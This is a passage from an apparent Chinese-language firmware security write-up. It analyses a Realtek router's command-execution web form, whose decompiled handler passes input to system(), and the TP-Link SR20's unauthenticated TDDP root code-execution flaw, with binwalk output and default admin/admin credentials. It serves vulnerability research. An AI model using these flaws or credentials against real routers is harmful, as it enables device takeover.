<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;! Copyright (c) Realtek Semiconductor Corp., 2003. All Rights Reserved. -&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html&quot;&gt;</span><br><span class="line">&lt;title&gt;System Command&lt;/title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function saveClick()&#123;</span><br><span class="line">        field = document.formSysCmd.sysCmd ;</span><br><span class="line">        if(field.value.indexOf(&quot;ping&quot;)==0 &amp;&amp; field.value.indexOf(&quot;-c&quot;) &lt; 0)&#123;</span><br><span class="line">                alert(&#x27;please add &quot;-c num&quot; to ping command&#x27;);</span><br><span class="line">                return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(field.value == &quot;&quot;)&#123;</span><br><span class="line">                alert(&quot;Command can&#x27;t be empty&quot;);</span><br><span class="line">                field.value = field.defaultValue;</span><br><span class="line">                field.focus();</span><br><span class="line">                return false ;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;blockquote&gt;</span><br><span class="line">&lt;h2&gt;&lt;font color=&quot;#0000FF&quot;&gt;System Command&lt;/font&gt;&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=/goform/formSysCmd method=POST name=&quot;formSysCmd&quot;&gt; &lt;!-- 漏洞点在/goform/formSysCmd --&gt;</span><br><span class="line">&lt;table border=0 width=&quot;500&quot; cellspacing=0 cellpadding=0&gt;</span><br><span class="line">  &lt;tr&gt;&lt;font size=2&gt;</span><br><span class="line"> This page can be used to run target system command.</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;&lt;hr size=1 noshade align=top&gt;&lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">  	&lt;td&gt;System Command: &lt;/td&gt;</span><br><span class="line">	&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sysCmd&quot; value=&quot;&quot; size=&quot;20&quot; maxlength=&quot;50&quot;&gt;&lt;/td&gt;</span><br><span class="line">	&lt;td&gt; &lt;input type=&quot;submit&quot; value=&quot;Apply&quot; name=&quot;apply&quot; onClick=&#x27;return saveClick()&#x27;&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; value=&quot;/syscmd.asp&quot; name=&quot;submit-url&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">  &lt;script language=&quot;JavaScript&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;textarea rows=&quot;15&quot; name=&quot;msg&quot; cols=&quot;80&quot; wrap=&quot;virtual&quot;&gt;&lt;% sysCmdLog(); %&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;input type=&quot;button&quot; value=&quot;Refresh&quot; name=&quot;refresh&quot; onClick=&quot;javascript: window.location.reload()&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;button&quot; value=&quot;Close&quot; name=&quot;close&quot; onClick=&quot;javascript: window.close()&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/blockquote&gt;</span><br><span class="line">&lt;/font&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>搜索formSysCmd漏洞点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/CTF-Workbench$ grep -r <span class="string">&quot;formSysCmd&quot;</span></span><br><span class="line">grep: _RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/bin/webs: 匹配到二进制文件</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/syscmd.asp:        field = document.formSysCmd.sysCmd ;</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/syscmd.asp:&lt;form action=/goform/formSysCmd method=POST name=<span class="string">&quot;formSysCmd&quot;</span>&gt;</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/obama.asp:        field = document.formSysCmd.sysCmd ;</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/obama.asp:&lt;form action=/goform/formSysCmd method=POST name=<span class="string">&quot;formSysCmd&quot;</span>&gt;</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/obama.asp:  &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;goform/formSysCmd&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span> name=<span class="string">&quot;writefile&quot;</span>&gt;</span><br><span class="line">_RB-1732_TC_v2.0.43.bin.extracted/squashfs-root/web/obama.asp:  &lt;form action=<span class="string">&quot;/goform/formSysCmd&quot;</span> method=POST name=<span class="string">&quot;readfile&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>发现有个webs二进制文件，跟进一下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">formSysCmd</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> Var; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// $s1</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// $s3</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $s1</span></span><br><span class="line">  <span class="built_in">void</span> (__fastcall *v14)(<span class="type">int</span>, _DWORD *); <span class="comment">// $t9</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// $a0</span></span><br><span class="line">  _BYTE *v16; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">104</span>]; <span class="comment">// [sp+20h] [-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Var = <span class="built_in">websGetVar</span>(a1, <span class="string">&quot;submit-url&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;sysCmd&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v4 = (_BYTE *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;writeData&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v5 = <span class="built_in">websGetVar</span>(a1, <span class="string">&quot;filename&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v6 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;fpath&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  v7 = (_BYTE *)<span class="built_in">websGetVar</span>(a1, <span class="string">&quot;readfile&quot;</span>, &amp;dword_47F498);</span><br><span class="line">  <span class="keyword">if</span> ( *v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(v20, <span class="number">100</span>, <span class="string">&quot;%s 2&gt;&amp;1 &gt; %s&quot;</span>, v3, <span class="string">&quot;/tmp/syscmd.log&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(v20); <span class="comment">//在这里存在RCE</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(v20, v6);</span><br><span class="line">    <span class="built_in">strcat</span>(v20, v5);</span><br><span class="line">    v8 = <span class="built_in">fopen</span>(v20, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    v9 = (_DWORD *)v8;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Open %s fail.\n&quot;</span>, v20);</span><br><span class="line">      v10 = a1;</span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">char</span> *)Var;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">websRedirect</span>(v10, v11);</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="built_in">fileno</span>(v8);</span><br><span class="line">    <span class="built_in">fchmod</span>(v12, <span class="number">511</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">240</span>) &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = (<span class="built_in">void</span> (__fastcall *)(<span class="type">int</span>, _DWORD *))&amp;fputc;</span><br><span class="line">        <span class="keyword">if</span> ( !v9[<span class="number">13</span>] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15 = (_BYTE *)v9[<span class="number">4</span>];</span><br><span class="line">        v14 = (<span class="built_in">void</span> (__fastcall *)(<span class="type">int</span>, _DWORD *))&amp;_fputc_unlocked;</span><br><span class="line">        v16 = (_BYTE *)(*(_DWORD *)(a1 + <span class="number">204</span>) + v13);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;= v9[<span class="number">7</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = (<span class="type">char</span>)*v16;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">v14</span>(v17, v9);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">        *v15 = *v16;</span><br><span class="line">        v9[<span class="number">4</span>] = v15 + <span class="number">1</span>;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="keyword">if</span> ( ++v13 &gt;= *(_DWORD *)(a1 + <span class="number">240</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = *(<span class="type">char</span> *)(*(_DWORD *)(a1 + <span class="number">204</span>) + v13);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">    <span class="built_in">fclose</span>(v9);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Write to %s\n&quot;</span>, v20);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;writepath, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v7 &amp;&amp; (v18 = <span class="built_in">fopen</span>(v6, <span class="string">&quot;r&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fclose</span>(v18);</span><br><span class="line">    <span class="built_in">sprintf</span>(v20, <span class="string">&quot;cat %s &gt; /web/obama.dat&quot;</span>, v6);</span><br><span class="line">    <span class="built_in">system</span>(v20);</span><br><span class="line">    <span class="built_in">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v11 = <span class="string">&quot;/obama.dat&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v11 = (<span class="type">const</span> <span class="type">char</span> *)Var;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">websRedirect</span>(v10, v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后台账密admin&#x2F;admin。</p>
<h3 id="TP-Link-Smart-Home-Router-远程代码执行漏洞"><a href="#TP-Link-Smart-Home-Router-远程代码执行漏洞" class="headerlink" title="TP-Link Smart Home Router 远程代码执行漏洞"></a>TP-Link Smart Home Router 远程代码执行漏洞</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://box.lenovo.com/l/8ufzWe%E3%80%82">https://box.lenovo.com/l/8ufzWe。</a></p>
<p>TP-Link Smart Home Router简称SR20，是一款支持ZigBee和Z-Wave物联网协议，且可作为控制中枢Hub使用的触屏WiFi路由器。其运行的协议为TP-Link设备调试协议TDDP，后者为TP-Link公司的一个专有协议，运行在UDP的1040端口。该协议v1版本存在远程代码执行漏洞，用户可通过该漏洞在SR20路由器上以root权限执行任意命令。</p>
<p>解压，有删减：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/CTF-Workbench$ binwalk ./tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin -Me</span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 20:04:54</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin</span><br><span class="line">MD5 Checksum:  77ba786e31e77a14f669865ebe429e87</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">155672        0x26018         LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 300028 bytes</span><br><span class="line">233464        0x38FF8         TRX firmware header, little endian, image size: 1941504 bytes, CRC32: 0x2DAE9AF0, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x0, rootfs offset: 0x0</span><br><span class="line">233492        0x39014         LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4629600 bytes</span><br><span class="line">1635467       0x18F48B        StuffIt Deluxe Segment (data): f%</span><br><span class="line">...</span><br><span class="line">2174969       0x212FF9        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 13061274 bytes, 2642 inodes, blocksize: 131072 bytes, created: 2018-05-19 04:25:38</span><br><span class="line">15897446      0xF29366        CRC32 polynomial table, little endian</span><br><span class="line">15901542      0xF2A366        CRC32 polynomial table, big endian</span><br><span class="line">16336334      0xF945CE        CRC32 polynomial table, little endian</span><br><span class="line">16786550      0x1002476       Unix path: /var/log/database/onboarding_status</span><br><span class="line">16907919      0x101FE8F       PNG image, 80 x 80, 8-bit/color RGBA, non-interlaced</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 20:04:55</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/26018</span><br><span class="line">MD5 Checksum:  553e40e02f73b6b88fb32d3afe4f00a7</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">264232        0x40828         Copyright string: <span class="string">&quot;Copyright (C) 2000-2008 Broadcom Corporation.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 20:04:55</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/39014</span><br><span class="line">MD5 Checksum:  c10e969334a47b84e2ed8ec15437d181</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">131072        0x20000         ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">&quot;/dev&quot;</span>, file name length: <span class="string">&quot;0x00000005&quot;</span>, file size: <span class="string">&quot;0x00000000&quot;</span></span><br><span class="line">131188        0x20074         ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">&quot;/dev/console&quot;</span>, file name length: <span class="string">&quot;0x0000000D&quot;</span>, file size: <span class="string">&quot;0x00000000&quot;</span></span><br><span class="line">131312        0x200F0         ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">&quot;/root&quot;</span>, file name length: <span class="string">&quot;0x00000006&quot;</span>, file size: <span class="string">&quot;0x00000000&quot;</span></span><br><span class="line">131428        0x20164         ASCII cpio archive (SVR4 with no CRC), file name: <span class="string">&quot;TRAILER!!!&quot;</span>, file name length: <span class="string">&quot;0x0000000B&quot;</span>, file size: <span class="string">&quot;0x00000000&quot;</span></span><br><span class="line">212827        0x33F5B         LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 64 bytes</span><br><span class="line">1322353       0x142D71        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 8195</span><br><span class="line">1448245       0x161935        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1284</span><br><span class="line">1448365       0x1619AD        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1288</span><br><span class="line">1449129       0x161CA9        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1284</span><br><span class="line">2873801       0x2BD9C9        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 5376</span><br><span class="line">2960765       0x2D2D7D        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1292</span><br><span class="line">2960769       0x2D2D81        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1304</span><br><span class="line">2960773       0x2D2D85        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1308</span><br><span class="line">3357216       0x333A20        Linux kernel version 2.6.36</span><br><span class="line">3420664       0x3431F8        CRC32 polynomial table, little endian</span><br><span class="line">3471404       0x34F82C        VxWorks symbol table, little endian, first entry: [<span class="built_in">type</span>: initialized data, code address: 0xC03EAD54, symbol address: 0xFFFF0012]</span><br><span class="line">3473524       0x350074        CRC32 polynomial table, little endian</span><br><span class="line">3990320       0x3CE330        xz compressed data</span><br><span class="line">4139540       0x3F2A14        Neighborly text, <span class="string">&quot;NeighborSolicits/ipv6/xfrm6_mode_transport.c&quot;</span></span><br><span class="line">4139560       0x3F2A28        Neighborly text, <span class="string">&quot;NeighborAdvertisementsnsport.c&quot;</span></span><br><span class="line">4141923       0x3F3363        Neighborly text, <span class="string">&quot;neighbor %.2x%.2x.%pM lostrename link %s to %s&quot;</span></span><br><span class="line">4222961       0x406FF1        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1284</span><br><span class="line">4522544       0x450230        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 17856</span><br><span class="line">4523359       0x45055F        LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 32 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 20:04:56</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/_39014.extracted/33F5B</span><br><span class="line">MD5 Checksum:  3b5d3c7d207e37dceeedd301e35e2e58</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2024-10-16 20:04:56</span><br><span class="line">Target File:   /home/blonet/桌面/CTF-Workbench/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/_39014.extracted/45055F</span><br><span class="line">MD5 Checksum:  70bc8f4b72a86921468bf8e8441dce51</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>TDDP v1版本不存在验证功能，向SR20的UDP 1040端口发送数据时，SR20接收并进行处理。若发送的数据的第二字节为0x31，SR20连接发送该请求的设备的TFTP服务并下载相应文件，然后用Lua解析器以root权限执行下载后的文件，造成远程代码执行漏洞。TDDP v2版本要求身份验证和对数据包载荷进行加密。</p>
<p>TDDP数据包格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|版本|类型|代码  |响应信息|</span><br><span class="line">|      数据包长度        |</span><br><span class="line">|数据包ID |子类型|保留    |</span><br><span class="line">|        摘要           |</span><br><span class="line">|        摘要           |</span><br><span class="line">|        摘要           |</span><br><span class="line">|        摘要           |</span><br></pre></td></tr></table></figure>

<p>查找TDDP相关的二进制程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blonet@blonet:~/桌面/CTF-Workbench/_tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin.extracted/squashfs-root$ find . -name <span class="string">&quot;tddp&quot;</span></span><br><span class="line">./usr/bin/tddp</span><br></pre></td></tr></table></figure>

<p>搜索字符串tddp，找到程序入口：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_936C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> optval; <span class="comment">// [sp+Ch] [bp-B0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+10h] [bp-ACh] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> timeout; <span class="comment">// [sp+14h] [bp-A8h] BYREF</span></span><br><span class="line">  fd_set readfds; <span class="comment">// [sp+1Ch] [bp-A0h] BYREF</span></span><br><span class="line"> 